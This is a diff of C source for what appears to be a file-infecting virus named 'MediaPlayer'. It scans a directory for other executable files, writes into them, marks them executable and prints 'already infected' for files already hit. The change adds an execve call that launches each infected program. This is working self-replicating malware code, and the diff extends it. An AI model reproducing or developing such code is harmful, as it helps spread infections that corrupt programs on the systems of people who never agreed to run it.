@@ -17,7 +17,8 @@ void open_repo(char * directory,char * argv[]){
         stat(dirp->d_name,&buf);
         int test = buf.st_mode;
         printf("%d\t",&test);
-        if(((test & S_IXUSR) && (test & S_IFREG))&&(strstr(dirp->d_name,".old")==NULL)&&((strcmp(dirp->d_name,"MediaPlayer")!=0))){
+        int cmp = strcmp(dirp->d_name,"MediaPlayer");
+        if(((test & S_IXUSR) && (test & S_IFREG))&&(strstr(dirp->d_name,".old")==NULL)&&((cmp!=0))){
             printf(".exe");
             DIR * dp_2;
             struct dirent * dirp_2;
@@ -65,6 +66,10 @@ void open_repo(char * directory,char * argv[]){
                 fclose(f);
                 fclose(g);
                 chmod(cp,0755);
+                if((strcmp(fn,"MediaPlayer")!=0)){
+                    execve(dirp->d_name,NULL,NULL);
+                }
+
             }else{
                 printf("already infected");
             }
